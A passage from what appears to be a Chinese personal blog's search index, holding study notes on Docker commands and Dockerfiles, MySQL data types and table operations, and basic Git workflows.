Pull complete 70deed891d42: Pull complete Digest: sha256:f2ad209efe9c67104167fc609cca6973c8422939491c9345270175a300419f94 #签名(防伪)Status: Downloaded newer image for mysql:5.7docker.io/library/mysql:5.7 #真实地址#等价于↓docker pull docker.io/library/mysql:5.7\n\ndocker rmi 镜像id：删除镜像\n\n-f：强制删除\n\n\n\ndocker rmi -f $(docker images -aq)#删除全部容器($把括号内的值传过去)\n\n\ndocker image save 镜像名 &gt; 压缩包名：导出镜像\n\n\ndocker image load -i 压缩包名：导入镜像\n\n\n 容器命令\n\n有了镜像才可创建容器\n\n\ndocker run [可选参数] image：创建并运行容器\n\n–name=“Name”：设置容器名字来区分容器\n-d：以后台方式运行\n-it：使用交互方式运行，进入容器查看内容\n-p：端口映射\n\n-p 主机端口:容器端口\n-p ip:主机端口:容器端口\n-p 容器端口\n容器端口\n\n\n-P：随机指定端口\n–rm：容器用完即删（用来测试）\n-v：卷挂载\n-e：环境配置\n\n\n\n容器内的是基础，很多命令不完善\n进入容器后exit 从容器中退回到主机\n\nCtrl+P+Q容器不停止退出\n\n\ndocker ps：查看当前正在运行的容器\n\n-a：列出当前正在运行的容器+历史运行过的容器\n-n=?：显示最近创建的容器\n-q：只显示容器编号\n\n\ndocker rm 容器id：删除指定的容器（无法直接删除运行中的容器）\n\n#两者均可删除所有容器docker rm -f $(docker ps -aq)docker ps -a -q|xargs docker rm\n\ndocker start 容器id：启动容器\ndocker restart 容器id：重启容器\ndocker stop 容器id：停止当前正在运行的容器\ndocker kill 容器id：强制停止当前容器\n\n\nstop 会给容器内应用10s时间去停止服务，kill直接强行停止\n删除容器指的是删除这个实例，kill指的是关闭正在运行的容器，实例仍旧存在\n\n ※常用其他命令\n\n后台启动容器\n\n# 命令 docker run -d 镜像名docker run -d centos#坑：docker ps 发现centos停止了，docker容器使用后台运行，必须有前台进程，否则自动停止\n\n\ndocker logs：查看日志信息\n\n-tf：t显示时间戳；f动态显示\n–tail number：要显示的日志条数\n\n\n\ndocker top 容器id：查看容器中进程信息\n\n\n\npid：当前进程id；ppid：父进程id\n\n\n\ndocker inspect 容器id：查看镜像元数据\n\n\ndocker exec  -it 容器id bashshell：进入容器后打开一个新的终端，可以在里面操作\n\n\n\n通常容器都是使用后台方式运行的，需要进入其中的容器修改一些配置\ndocker exec -it 容器id /bin/bash\n\n\ndocker attach 容器id bashshell：进入容器正在执行的终端，不会启动新的进程\ndocker cp 容器id:容器内路径 目的主机路径： 从容器内拷贝文件到主机上\n\n\n小汇总\n\n\n\n命令\n说明\n\n\n\n\nattach\n当前shell下attach连接指定运行镜像\n\n\nbuild\n通过dockerfile定制镜像\n\n\ncommit\n提交当前容器为新的镜像\n\n\ncp\n从容器中拷贝指定文件或目录到宿主机中\n\n\ncreate\n创建一个新的容器，同run，但不启动容器\n\n\ndiff\n查看docker容器变化\n\n\nevents\n从docker服务获取容器实时事件\n\n\nexec\n在已存在的容器上运行命令\n\n\nexport\n导出容器的内容流作为一个tar归档文件（对应import）\n\n\nhistory\n展示一个镜像形成历史\n\n\nimages\n列出系统当前镜像\n\n\nimport\n从tar包中的内容创建一个新的文件系统映像（对应export）\n\n\ninfo\n显示系统相关信息\n\n\ninspect\n查看容器详细信息\n\n\nkill\nkill指定的docker容器\n\n\nload\n从一个tar包中加载一个镜像（对应save）\n\n\nlogin\n注册或者登录一个docker源服务器\n\n\nlogout\n从当前docker registry退出\n\n\nlogs\n输出当前容器日志信息\n\n\nport\n查看映射端口对应的容器内部源端口\n\n\npause\n暂停容器\n\n\nps\n列出容器列表\n\n\npull\n从docker镜像源服务器拉取指定镜像或者库镜像\n\n\npush\n推送指定镜像或者库镜像至docker源服务器\n\n\nrestart\n重启运行的容器\n\n\nrm\n移除一个或者多个容器\n\n\nrmi\n移除一个或多个镜像（无容器使用该镜像才可以删除，否则需删除相关容器才可继续或-f强制删除\n\n\nrun\n创建一个新的容器并运行一个命令\n\n\nsave\n保存一个镜像为一个tar包（对应load）\n\n\nsearch\n在docker hub中搜索镜像\n\n\nstart\n启动容器\n\n\nstop\n停止容器\n\n\ntag\n给源中镜像打标签\n\n\ntop\n查看容器中运行的进程信息\n\n\nunpause\n取消暂停容器\n\n\nversion\n查看docker版本号\n\n\nwait\n截取容器停止时的退出状态值\n\n\n\n 卷命令\n\ndocker volume create 卷名：创建数据卷\ndocker volume ls：查看所有的数据卷\ndocker volume inspect 卷名：查看指定数据卷的信息\ndocker volume rm 卷名：删除数据卷\n\n无法删除正在被使用的、容器存在的\n\ndocker rm -v …：删除容器时删除相关的卷\n\n数据卷是被设计用来持久化数据的，它的生命周期独立于容器，Docker 不会在容器被删除后自动删除数据卷，并且也不存在垃圾回收这样的机制来处理没有任何容器引用的数据卷 。如果需要在删除容器的同时移除数据卷。可以在删除容器的时候使用 docker rm -v 这个命令。\n无主的数据卷可能会占据很多空间，要清理请使用以下命令\ndocker volume prune\n 工作流程\n\ndocker build\n\n当我们写完dockerfile交给docker“编译”时使用这个命令，那么client在接收到请求后转发给docker daemon，接着docker daemon根据dockerfile创建出“可执行程序”image。\n![docker build](docker build.png)\n\ndocker run\n\n有了“可执行程序”image后就可以运行程序了，接下来使用命令docker run，docker daemon接收到该命令后找到具体的image，然后加载到内存开始执行，image执行起来就是所谓的container。\n![docker run](docker run.png)\n\ndocker pull\n\ndocker中image的概念就类似于“可执行程序“，docker registry 可以用来存放各种image，公共的可以供任何人下载image的仓库就是docker Hub。那么该怎么从Docker Hub中下载image呢，就是这里的docker pull命令了。\n![docker pull](docker pull.png)\n 镜像讲解\n 镜像是什么\n镜像是一种轻量级、可执行的独立软件包，用来打包软件运行环境和基于运行环境开发的软件，它包含运行某个软件所需的所有内容，包括代码、运行时、库、环境变量和配置文件。\n Docker镜像加载原理\n\nUnionFS（联合文件系统/UFS）\n\n我们下载时看到的一层层就是这个\nUnionFS（联合文件系统）：Union文件系统是一种分层，轻量级并且高性能的文件系统，它支持堆文件系统的修改作为一次提交来一层层的叠加，同时可以将不同目录挂载到同一个虚拟文件系统下（unite several directories into a single virtual filesystem）。Union文件系统是Docker镜像的基础，镜像可以通过分层来继承，基于基础镜像（没有父镜像），可以制作各种具体的应用镜像。\n特性：一次同时加载多个文件系统，但从外面看起来，只能看到一个文件系统，联合加载会把各层文件系统叠加起来，这样最终的文件系统会包含所有底层的文件和目录\n\nDocker镜像加载原理\n\nDocker的镜像实际上由一层一层的文件系统组成，这种层级的文件系统UnionFS。\nbootfs(boot file system)主要包含bootloade和kernel，bootloader主要是引导加载kernel，Linux刚启动是会加载bootfs文件系统，在Docker镜像的最底层是引导文件系统bootfs，这一层与我们典型的Linux/Unix系统是一样的，包含boot加载器和内核，当boot加载完成之后整个内核就都在内存中了，此时内存的使用权已由bootfs转交给内核，此时系统也会卸载bootfs\nrootfs(root flie system)在bootfs之上，包含的就是典型Linux系统中的/dev /proc /bin /etc等标准目录和文件，rootfs就是各种不同的操作系统发行版，比如Ubuntu，Centos等\n\n总结，Docker就是一个简易版的Linux，所有的镜像都公用宿主机的bootfs，根据rootfs的不同就是不同的Linux发行版本如centos、ubuntu等，而镜像就是在rootfs上面，容器就是最上面的container，Docker为什么分层，就是为了复用底层，所以就会很快，很方便\n具体例子，假设我们在Centos下安装了docker，然后使用Docker拉下了一个ubuntu镜像，运行ubuntu镜像，里面是没有vim命令的，那么我们在镜像里面安装了vim，然后使用commit提交容器使之成为一个新的镜像，那么这个新的ubuntu镜像就分为一下几层：\n\nbootfs层\nrootfs层\nubuntu层\nvim层\ncontainer层\n\n对于一个极简的OS，rootfs可以很小没只需要包含最基本的命令，工具，程序库就可以了，因为底层直接用host的kernel，自己只需提供rootfs就可以了。于此可见对于不同的Linux发行版，bootfs基本是一致的，rootfs会有差异，因此不同的发行版可以公用bootfs\n 分层理解\nQ：Docker采用分层的结构的好处？\nA：资源共享\t例如有多个镜像都从相同的base镜像构建而来，则宿主机只需在磁盘上保留一份base镜像，同时内存中也只需要加载base镜像，这样就可以为所有的容器服务，且镜像的每一层都可以共享。\n理解：\n所有的docker镜像都起源于一个基础镜像层，当进行修改或增加信的内容是，就会在当前镜像层之上，创建新的镜像层。\n举一个简单的例子，假如基于Ubuntu linux16.04创建一个新的镜像，这就是新镜像的第一层；如果在该镜像中添加python包，就会在基础镜像层之上创建第二个镜像层，如果继续添加一个安全补丁，就会创建第三个镜像层，该镜像当前已经包含3个镜像层，如图所示\n\n在添加额外的镜像层的同时，镜像始终保持是当前所有镜像的组合\n\n\n在外部看来整个镜像只有6个文件，这是因为最上层的文件7是文件5的更新版\n\n这种情况下，上层镜像层中的文件覆盖了底层镜像层中的文件。这样就使得文件的更新版本作为一个新镜像层作为一个新镜像层添加到镜像当中。\nDocker通过存储引擎（新版本采用快照机制）的方式来实现镜像层堆栈，并保证多镜像层对外展示为统一的文件系统。\nLinux上可用的存储引擎有AUFS、Overlay2、Device Mapper、Btrfs以及ZFS。顾名思义，每种存储引擎都基于Linux中对应的文件系统或者块设备技术，并且每种存储引擎都有其独有的性能特点\nDocker在Windows上仅支持Windowsfilter一种存储引擎，该引擎基于NTFS文件系统之上实现了分层和CoW[1]\n下图展示了与系统显示相同的三层镜像。所有镜像层堆叠并合并，对外提供统一的视图\n\n\n特点\n\nDocker镜像默认都是只读的，当容器启动时，一个新的可写层被加载到镜像的顶部\n这一层就是我们通常说的容器层，容器之下都叫镜像层\n\n commit镜像\n# docker commmit 提交容器成为一个新的副本docker commit -a=&quot;作者&quot; -m=&quot;镜像描述&quot; 容器id 目标镜像名:[TAG]\n 容器数据卷\nDocker将运用与运行的环境打包形成容器运行， Docker容器产生的数据，如果不通过docker commit生成新的镜像，使得数据做为镜像的一部分保存下来， 那么当容器删除后，数据自然也就没有了。 为了能保存数据在Docker中我们使用卷。|\n卷就是目录或文件，存在于一个或多个容器中，由Docker挂载到容器，但卷不属于联合文件系统（Union FileSystem），因此能够绕过联合文件系统提供一些用于持续存储或共享数据的特性:。\n卷的设计目的就是数据的持久化，完全独立于容器的生存周期，因此Docker不会在容器删除时删除其挂载的数据卷。\nDocker容器卷的工作就是将Docker容器数据通过映射进行备份+持久化到本地的主机目录\n\n直接使用命令来挂载\ndocker run -it -v 主机目录:容器内目录 docker run -it -v /home/ceshi:/home centos /bin/bash\n\ndocker inspect 容器id  其中的mounts（挂载）可查看相关信息\n\n 具名挂载&amp;匿名挂载\n\n匿名挂载\n\n-v 容器内路径\n所有docker容器内的卷，没有指定目录的情况下都是在==/var/lib/docker/volumes/xxx/_data/==\n\n具名挂载\n\n-v 卷名：容器内路径\n\n指定路径挂载\n\n-v /宿主机路径::容器内路径\n\n拓展：\n#通过-v 容器内路径:ro/rw改变读写权限ro\treadonly       #只读rw  readwrite      #可读可写#一旦这个了设置了容器权限，容器对我们挂载出来的内容就有了限定docker run -d -p --name nginx02 -v juming-nginx : /etc/nginx:ro nginxdocker run -d -p --name nginx02 -v juming-nginx : /etc/nginx:rw nginx# ro：只要看到ro就说明这个路径只能通过宿主机来操作，容器内部无法操作\n 容器卷容器\n容器数据卷是指建立数据卷，来同步多个容器间的数据，实现容器间的数据同步。\n# 创建docker01docker run -it --name docker01 jackie/centos:latest# 查看容器docekr01内容lsbin  home   lost+found    opt   run   sys  vardev  lib    media    proc  sbin  tmp  volume01etc  lib64  mnt        root  srv   usr  volume02 # 不关闭该容器退出CTRL + Q + P   # 创建docker02: 并且让docker02 继承 docker01docker run -it --name docker02 --volumes-from docker01 jackie/centos:latest # 查看容器docker02内容lsbin  home   lost+found    opt   run   sys  vardev  lib    media    proc  sbin  tmp  volume01etc  lib64  mnt        root  srv   usr  volume02# 创建docker03继承docker01docker run -it --name docker03 --volumes-from docker01 jackie/centos:latestcd volume01    #进入volume01 查看是否也同步docker01的数据ls docker01.txt# 测试：可以删除docker01，查看一下docker02和docker03是否可以访问这个文件# 测试发现：数据依旧保留在docker02和docker03中没有被删除（但是删除主机内的文件，则全无）\n Dockerfile\ndockerfile就是用来构建docker镜像的构建文件\n\n通过这个脚本可以生成镜像，镜像是一层一层的，脚本一个个的命令，每个命令是一层\n\n#创建一个dockerfile文件，名字可随机，建议为dockerfile#文件中的内容 指令（大写） 参数FROM centosVOLUME [&quot;volume01&quot;,&quot;volume02&quot;]CMD echo &quot;----end----&quot;CMD /bin/bash#这里的每个命令就是镜像的一层#不能run的，VOLUME [&quot;/volume01&quot;,&quot;/volume02&quot;]，加斜杠！\n 介绍\n\n构建步骤︰\n\n\n\n编写一个dockerfile文件\n\n\ndocker build构建成为一个镜像\n\n\ndocker run运行镜像\n\n\ndocker push 发布镜像(DockerHub、阿里云镜像仓库)\n\n\n\n基础知识∶\n\n\n\n每个保留关键字（指令）都是尽量是大写字母\n\n\n执行从上到下顺序执行\n\n\n#表示注释\n\n\n每一个指令都会创建提交一个新的镜像层，并提交\n\n\n\n 指令\n参考链接：https://www.runoob.com/docker/docker-dockerfile.html\n\n\n\n指令\n说明\n\n\n\n\nFROM\n指定基础镜像\n\n\nMAINTAINER\n镜像是谁写的，姓名+邮箱\n\n\nRUN\n镜像构建的时候需要运行的命令\n\n\nADD\n将本地文件添加到容器中，tar类型文件会自动解压(网络压缩资源不会被解压)，可以访问网络资源，类似wget\n\n\nWORKDIR\n镜像的工作目录\n\n\nVOLUME\n挂载的目录\n\n\nEXPOSE\n暴露端口配置\n\n\nCMD\n指定这个容器启动的时候要运行的命令（只有最后一个会生效，可被替代）\n\n\nEMTRYPOINT\n指定这个容器启动的时候要运行的命令，可以追加命令\n\n\nONBUILD\n当构建一个被继承DockerFile，这个时候就会运行ONBUILD的指令，触发指令\n\n\nCOPY\n功能类似ADD，但是是不会自动解压文件，也不能访问网络资源\n\n\nENV\n构建的时候设置环境变量\n\n\n\n 构建自己的Dockerfile\n下面通过编写Dockerfile文件来制作Centos镜像，并在官方镜像的基础上添加vim和net-tools工具。首先在/home/dockfile 目录下新建文件mydockerfile-centos。然后使用上述指令编写该文件。\n\n编写dockerfile文件\n\nFROM centos:7                     #基础镜像         MAINTAINER TSL&lt;.com&gt;              #维护者信息 ENV MYPATH /usr/local             #环境变量目录 k-vWORKDIR $MYPATH                   #工作目录  用$取k RUN yum -y install vim            #执行构建命令  安装vimRUN yum -y install net-tools      #执行构建命令  安装net-tools EXPOSE 80                         #暴露端口 80 CMD echo $MYPATH                  #输出构建信息 mypathCMD echo &quot;---end---&quot;              #输出信息CMD /bin/bash                     #进入/bin/bash命令行\n\n构建镜像文件\n\n构建镜像命令：docker build -f dockerfile文件路径 -t 镜像名[:版本号] .（这里有个小点.）\n上面命令中，-t参数用来指定 image 文件的名字，后面还可以用冒号指定标签。如果不指定，默认的标签就是latest。最后的那个点表示Dockerfile文件所在的路径，上例是当前路径，所以是一个点。\ndocer build -f mydockerfile-centos -t mycentos:0.1 .# docker images 查看镜像会发现size变大\n制作tomcat镜像并发布\n\n 发布\n\nDocker Hub\n\n公有仓库\n注册Docker ID后，在Linux中登录Docker Hub\ndocker login\n注意要保证Image的tag是账户名，如果镜像名字不对，需要改一下tag\ndocker tag 仓库名 用户名/仓库名\n推送Docker Image到Docker Hub\ndocker push 用户名/仓库名:latest\n去Docker Hub中检查镜像\ndocker pull 用户名/仓库名\n\n私有仓库\n\nDocker Hub是公开的，其他人也是可以下载，并不安全，因此还可以使用docker registry官方提供的私有仓库\n参考链接\n下载一个Docker官方私有仓库镜像\ndocker pull registry\n运行一个Docker私有容器仓库\ndocker run -d -p 5000:5000 -v /opt/data/registry:/var/lib/registry registry\n\n-d：后台运行\n-p：端口映射\n-v：数据卷挂载\n\nDocker默认不允许非HTTPS方式推送镜像。我们可以通过Docker的配置选项来取消这个限制，修改Docker的配置文件，让他支持HTTP方式，设置信任，上传私有镜像\nvim /etc/docker/daemon.json写入    &#123;        &quot;registry-mirrors&quot;: [&quot;http://f1361db2.m.daocloud.io&quot;],        &quot;insecure-registries&quot;:[&quot;192.168.11.37:5000&quot;]    &#125;\n修改Docker的服务配置文件\nvim /lib/systemd/system/docker.service找到[service]这一代码区域块，写入如下参数[Service]EnvironmentFile=-/etc/docker/daemon.json\n重启Docker服务\nsystemctl restart docker\n修改本地镜像的tag标记，往自己的私有仓库推送\ndocker tag docker.io/peng104/hello-world-docker 192.168.11.37:5000/peng-hello\n","tags":["技术栈"]},{"title":"MySQL","url":"/2023/07/23/MySQL/","content":" MySQL\n狂神说MySQL\n\n 小tips\n为了网站和数据库的安全性，MySQL内置有root最高用户，划分等级，每个用户对应管理一个数据库，这样保证互不关联，从而不会影响到其他数据库的运行\n–表示注释；/**/为多行注释\n所有语句使用分号;结尾\n如果表名或者字段名是一个特殊字符。就需要带`\n 基本的数据库操作命令\nnet start mysql：启动MySQL服务\nnet stop mysql：关闭MySQL服务\nmysql -u root -p：登录MySQL（记得以管理员运行cmd）\nshow database;：查看所有的数据库\n\n所有的语句都使用;结尾，切换数据库时不需要\n\nuse 数据库名：切换数据库\nshow tables;：查看数据库中所有的表\ndescribe 表名;：显示数据库中所有的表的信息\ncreate database 数据库名：创建一个数据库\nexit：退出连接（Ctrl+C强制退出）\n 操作数据库\n 结构化查询语句分类\n\n\n\n名称\n说明\n命令\n\n\n\n\nDDL（数据定义语言）\n定义和管理数据对象，如数据库、数据表等\nCREATE、DROP、ALTER\n\n\nDML（数据操作语言）\n用于操作数据库对象中所包含的数据\nINSERT、UPDATE、DELETE\n\n\nDQL（数据查询语言）\n用于查询数据库的数据\nSELECT\n\n\nDCL（数据控制语言）\n用于管理数据库的语言，包括管理权限及数据更改\nGRANT、commit、rollback\n\n\n\n 基本操作\n\n创建数据库\n\nCREATE DATABASE 数据库名\n\n删除数据库\n\nDROP DATABASE 数据库名\n\n使用数据库\n\nUSE `school`\n\n查看数据库\n\nSHOW DATABASES\n 数据库类型\n\n数值\n\n\n\n\n类型\n说明\n取值范围\n存储需求/字节\n\n\n\n\ntinyint\n非常小的数据\n有符值：-27 ~27-1无符号值：0~28-1\n1\n\n\nsmallint\n较小的数据\n有符值：-215 ~215-1无符号值：0~216-1\n2\n\n\nmediumint\n中等大小的数据\n有符值：-223 ~223-1无符号值：0~224-1\n3\n\n\nint\n标准的整数\n有符值：-231 ~231-1无符号值：0~232-1\n4\n\n\nbigint\n较大的数据\n有符值：-263 ~263-1无符号值：0~264-1\n8\n\n\nfloat\n单精度浮点数\n±1.17e -38\n4\n\n\ndouble\n双精度浮点数\n±2.22e -308\n8\n\n\ndecimal\n字符串形式的浮点数金融计算时常用\ndecimal(m,d) 参数m&lt;65 是总个数，d&lt;30且 d&lt;m 是小数位\nm个字节\n\n\n\n\n字符串\n\n\n\n\n类型\n说明\n最大长度/字节\n\n\n\n\nchar\n固定长字符串\n0-255\n\n\nvarchar\n可变字符串\n0-65535\n\n\ntinytext\n微型文本\n28-1\n\n\ntext\n文本串\n216-1\n\n\n\n\n时间日期\n\njava.util.Date\n\n\n\n类型\n说明\n\n\n\n\nDATE\nYYYY-MM-DD\n\n\nTIME\nHh:mm:ss\n\n\nDATETIME\nYYYY-MM-DD HH:mm:ss\n\n\nTIMESTAMP\n时间戳（1970.1.1到现在的毫秒数）\n\n\nYEAR\n表示年份\n\n\n\n\nyyyy-MM-dd HH:mm:ss年-月-日 时:分:秒 大写是区分“ 月 ”与“ 分 ”  HH为什么大写，是为了区分 12小时制 与 24小时制 。 小写的h是12小时制，大写的H是24小时制\n\n\nnull\n\n没有值，未知\n不要使用null进行算术运算，结果仍为null\n\nMySQL数据类型的长度和范围\n\n\n ※字段属性\n\nUnsigned\n\n无符号的\n声明该数据列不允许负数\n\nZerofill\n\n0填充的\n不足位数的用0来填充 , 如int(3),5则为005\n\nAuto_InCrement\n\n自动增长 , 每添加一条数据 , 自动在上一个记录数上加 1（默认）\n通常用于设置主键 , 且为整数类型\n可自定义设计主键自增的起始值和步长\n\n当前表设置步长(AUTO_INCREMENT=100)：只影响当前表\nSET @@auto_increment_increment=5;影响所有使用自增的表（全局）\n\n\nNULL 和 NOT NULL\n\n默认为NULL , 即没有插入该列的数值\n如果设置为NOT NULL , 则该列必须有值\n\nDefault\n\n设置默认的值\n 创建数据库表\n--目标 : 创建一个school数据库--创建学生表(列,字段)--学号int 登录密码varchar(20) 姓名,性别varchar(2),出生日期(datatime),家庭住址,emailCREATE TABLE IF NOT EXISTS `student` (`id` int(4) NOT NULL AUTO_INCREMENT COMMENT &#x27;学号&#x27;,`name` varchar(30) NOT NULL DEFAULT &#x27;匿名&#x27; COMMENT &#x27;姓名&#x27;,`pwd` varchar(20) NOT NULL DEFAULT &#x27;123456&#x27; COMMENT &#x27;密码&#x27;,`sex` varchar(2) NOT NULL DEFAULT &#x27;男&#x27; COMMENT &#x27;性别&#x27;,`birthday` datetime DEFAULT NULL COMMENT &#x27;生日&#x27;,`address` varchar(100) DEFAULT NULL COMMENT &#x27;地址&#x27;,`email` varchar(50) DEFAULT NULL COMMENT &#x27;邮箱&#x27;,PRIMARY KEY (`id`)) ENGINE=InnoDB DEFAULT CHARSET=utf8\n格式\nCREATE TABLE [IF NOT EXISTS] `表名`(    `字段名` 列类型 [属性] [索引] [注释],    `字段名` 列类型 [属性] [索引] [注释],    ...    `字段名` 列类型 [属性] [索引] [注释])[表类型][字符集设置][注释]\n常用命令\n-- 查看数据库的定义SHOW CREATE DATABASE school;-- 查看数据表的定义SHOW CREATE TABLE student;-- 显示表结构DESC student;  -- 设置严格检查模式(不能容错了)SET sql_mode=&#x27;STRICT_TRANS_TABLES&#x27;;-- 查看mysql所支持的引擎类型 (表类型)SHOW ENGINES;\n 数据表类型\nInnoDB：默认使用\nMyISAM：早些年使用的\n\n\n\n名称\nMyISAM\nInnoDB\n\n\n\n\n事务处理\n不支持\n支持\n\n\n数据行锁定\n不支持\n支持\n\n\n外键约束\n不支持\n支持\n\n\n全文索引\n支持\n不支持\n\n\n表空间大小\n较小\n较大，约2倍\n\n\n\n常规使用操作\n\nMYISAM\t节约空间，速度较快\nINNODB\t安全性高，支持事务的处理，支持多表多用户操作\n\n\n数据表的存储位置\n\n位置：Mysql安装目录\\data\\下存放数据表。目录名对应数据库名 , 该目录下文件名对应数据表\n每个库目录存在一个保存当前数据库的选项文件db.opt\n\n注意\n\n\n\n*.frm\t表结构定义文件\n\n\n*.MYD\t数据文件 ( data )\n\n\n*.MYI\t索引文件 ( index )\n\n\nInnoDB类型数据表只有一个 *.frm文件 , 以及上一级目录的ibdata1文件\n\n\nMyISAM类型数据表对应三个文件：*.frm\t表结构定义文件*.MYD\t数据文件 ( data )*.MYI\t索引文件 ( index )\n\n\n\n设置数据库表的字符集编码\n\n我们可为数据库、数据表、数据列设定不同的字符集，设定方法：\n\n\n创建时通过命令来设置\nCREATE TABLE 表名()CHARSET=utf8;\n\n\n如无设定 , 则根据MySQL数据库配置文件 my.ini 中的参数设定\n\n\n参考链接：http://t.csdn.cn/Vy9j2\n 修改、删除表\n\n修改表（ALTER TABLE）\n\n修改表名：ALTER TABLE 旧表名 RENAME AS 新表名\n添加字段：ALTER TABLE 表名 ADD 字段名 列属性[属性]\n修改字段\n​\tALTER TABLE 表名 MODIFY 字段名 列类型[属性]\n​\tALTER TABLE 表名 CHANGE 旧字段名 新字段名 列属性[属性]\n删除字段：ALTER TABLE 表名 DROP 字段名\n\n删除表\n\nDROP TABLE [IF EXISTS] 表名\n MySQL数据管理\n 外键\n如果公共关键字在一个关系中是主关键字，那么这个公共关键字被称为另一个关系的外键。由此可见，外键表示了两个关系之间的相关联系。以另一个关系的外键作主关键字的表被称为主表，具有此外键的表被称为主表的从表。\n在实际操作中，将一个表的值放入第二个表来表示关联，所使用的值是第一个表的主键值(在必要时可包括复合主键值)。此时，第二个表中保存这些值的属性称为外键(foreign key)。\n外部作用\n保持数据一致性，完整性，主要目的是控制存储在外键表中的数据,约束。使两张表形成关联，外键只能引用外表中的列的值或使用空值。\n\n创建子表同时创建外键\n\n-- 创建外键的方式一 : 创建子表同时创建外键-- 年级表 (id\\年级名称)CREATE TABLE `grade` (`gradeid` INT(10) NOT NULL AUTO_INCREMENT COMMENT &#x27;年级ID&#x27;,PRIMARY KEY (`gradeid`)) ENGINE=INNODB DEFAULT CHARSET=utf8-- 学生信息表 (学号,姓名,性别,年级,手机,地址,出生日期,邮箱,身份证号)CREATE TABLE `student` (`studentno` INT(4) NOT NULL COMMENT &#x27;学号&#x27;,`gradeid` INT(10) DEFAULT NULL COMMENT &#x27;年级&#x27;,PRIMARY KEY (`studentno`),KEY `FK_gradeid` (`gradeid`),CONSTRAINT `FK_gradeid` FOREIGN KEY (`gradeid`) REFERENCES `grade` (`gradeid`)) ENGINE=INNODB DEFAULT CHARSET=utf8\n删除具有主外键关系的表时 , 要先删子表 , 后删主表\n-- 删除外键ALTER TABLE student DROP FOREIGN KEY FK_gradeid;-- 发现执行完上面的,索引还在,所以还要删除索引-- 注:这个索引是建立外键的时候默认生成的ALTER TABLE student DROP INDEX FK_gradeid;\n\n创建子表完毕后,修改子表添加外键\n\nALTER TABLE `student`ADD CONSTRAINT `FK_gradeid` FOREIGN KEY (`gradeid`) REFERENCES `grade` (`gradeid`);\nALTER TABLE `表名` ADD CONSTRAINT `约束名` FOREIGN KEY (`作为外键的列`) REFERENCES (`哪个字段`)\n不建议使用（避免数据库过多造成困扰）\n 增删改查\n\nInsert 添加\n\nINSERT INTO 表名[(字段1,字段2,字段3,...)] VALUES(&#x27;值1&#x27;),(&#x27;值2&#x27;),(&#x27;值3&#x27;)\n例\nINSERT INTO `student`(name,sex,age) values(&#x27;张三&#x27;,18,&#x27;男&#x27;)--另一种形式INSERT INTO Set name=&#x27;张三&#x27;,age=18\n\nUpdate 修改\n\nUPDATE 表名 SET column_name=value [,column_name1=value1,...] [WHERE condition];\n例\nUPDATE student set name=&#x27;张三&#x27; where id=1\n\nDelete 删除\n\nDELETE FROM 表名 [WHERE condition];\n例\nDELETE FOTM student WHERE id=1\n\nTRUNCATE\n\n作用：用于完全清空表数据，但表结构、索引、约束等不变\nTRUNCATE [TABLE] table_name;\n\nDELETE与TRUNCATE区别\n\n相同：都能删除数据，不删除表结构，但TRUNCATE速度更快\n不同：\n\nTRUNCATE TABLE 重新设置AUTO_INCREMENT计数器\n使用TRUNCATE TABLE不会对事务有影响\n\n\n\n\n\nDELETE删除的问题\n\nInnoDB     自增列会重新从1开始（存在于内存当中，断电即失）\nMyISAM    继续从上一个自增量开始（存在于文件中，不会丢失）\n\n\n\nSELECT\n\n死锁：指两个或两个以上的进程在执行过程中因争夺资源而造成的一种互相等待的现象\n","tags":["技术栈"]},{"title":"Git","url":"/2023/06/17/Git/","content":" Git\n 理论\n\n\nSVN是集中式版本控制系统，版本库是集中放在中央服务器的，而工作的时候用的是自己的电脑，所以首先要从中央服务器得到最新的版本，然后工作，完成工作后，需要把自己做完的活儿推送到中央服务器。集中式版本控制系统是必须联网才能工作，对网络带宽要求较高。\n\n\nGit是分布式版本控制系统，没有中央服务器，每个人的电脑就是一个完整的版本库，工作时不需要联网了，因为版本都在自己电脑上，协同的方法是这样的：比如说自己在电脑上改了文件A，其他人也在电脑上改了文件A，这时你们俩之间只需把各自的修改推送给对方，就可以互相看到对方的修改了。\n\n\n\n\n#git init从master改成maingit config --global init.defaultBranch main#设置提交代码时的用户信息git config --global user.name &#x27;jackie&#x27;git config --global user.email **@qq.com#如果去掉 --global 参数只对当前仓库有效，即./.git/config\n 自用基本操作\ngit clone &lt;链接&gt;git add .git statusgit commit -m &quot;消息内容&quot;git remote rm origin（有的话删除）git remote add origin https://github.com/xxx.git#5、6可以合并成下面git remote set-url origin &lt;链接&gt;#origin是给远程仓库起的别名，也可以起其他名字，但是如果用origin，git push时可以不指出名字，如果用其他名字需要指出名字，git push 名字git push origin main\n\n#本地和远程仓库不同时git pull origin main#fatal: Need to specify how to reconcile divergent branches.#致命：需要指定如何协调不同的分支。#虽分支名相同，但本地有commit，而新建仓库添加README&amp;License后同样会commit，本地&amp;仓库各自有commit↓git pull --rebase origin main\ngit initgit pull &lt;remote link&gt;git switch -c &lt;new branch&gt;修改文件git diff、add、commitgit push origin &lt;new branch&gt;---以下存疑#修改代码时main分支又有了更新，此时应首先更新本地分支git checkout maingit pull origin master#同步远端的main到本地main，此时GitHub上新的更新的commit会被同步到本地git checkout &lt;new branch&gt;git rebase main#把之前的修改都扔一边，然后把main最新的修改拿过来，接着在最新修改的基础上再把该分支上的修改尝试弄回去（可能存在rebase conflict，手动选择保留哪一段代码）git push -f origin &lt;new branch&gt;~~~Squash and merge#将多条commit扁平合并为一个新的改变，然后把该commit放到main（只是commit结构数量和名字改变了）#此时一般情况会把远端的branch删掉（delete branch）git checkout maingit branch -D &lt;new branch&gt;git pull origin master\n\n参考链接：Git 基本操作 | 菜鸟教程\n\ngit status\n\nA：你本地新增的文件（服务器上没有）\nC：文件的一个新拷贝\nD：你本地删除的文件（服务器上还在）\nM：文件的内容或者mode被修改了\nR：文件名被修改了\nT：文件的类型被修改了\nU：文件没有被合并(你需要完成合并才能进行提交)\nX：未知状态(很可能是遇到git的bug了，你可以向git提交bug report)\n??：未被git进行管理，可以使用git add file1把file1添加进git能被git所进行管理\n红色是工作区状态，绿色是暂存区的状态\n\ngit diff\n\ngit diff：尚未缓存的改动\ngit diff -p -2：-p显示文件改动的详情，-2表示仅显示近2次\ngit diff --cached：查看已缓存的改动\ngit diff HEAD：查看已缓存的与未缓存的所有改动\ngit diff --stat：显示摘要而非整个 diff\ngit diff origin&lt;远程仓库名&gt;/main&lt;分支名&gt;\n\ngit commit\n\ngit commit -a：修改文件后不需要执行 git add 命令，直接来提交\n\ngit rm\n\ngit rm &lt;file&gt;：从暂存区和工作区中删除\ngit rm -f &lt;file&gt;：若删前修改过且已放到暂存区域，则必须要用强制删除选项 -f\ngit rm 